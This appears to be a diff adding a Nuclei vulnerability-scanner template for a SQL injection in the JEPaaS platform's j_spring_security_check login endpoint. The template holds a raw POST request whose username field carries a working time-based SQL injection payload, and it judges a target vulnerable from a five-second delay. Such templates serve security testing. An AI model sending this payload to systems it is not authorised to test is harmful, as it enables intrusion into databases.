@@ -1,0 +1,28 @@
+id: jepaas-j-spring-security-check-sqli
+
+info:
+  name: Jepaas j-spring-security-check - SQL Injection
+  author: qwtd
+  severity: high
+  description: |
+    Jepaas j-spring-security-check contains a SQL injection vulnerability. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the context of the affected site.
+  reference:
+    - https://mp.weixin.qq.com/s/8ldYlKg11GbOwjOHgRjUvg
+  tags: JEPaaS低代码平台
+
+http:
+  - raw:
+      - |
+        POST /j_spring_security_check HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+        
+        j_username=');DECLARE @x CHAR(9);SET @x=0x303a303a35;WAITFOR DELAY @x--
+      
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration >= 5'
+          - 'status_code == 302'
+        condition: and
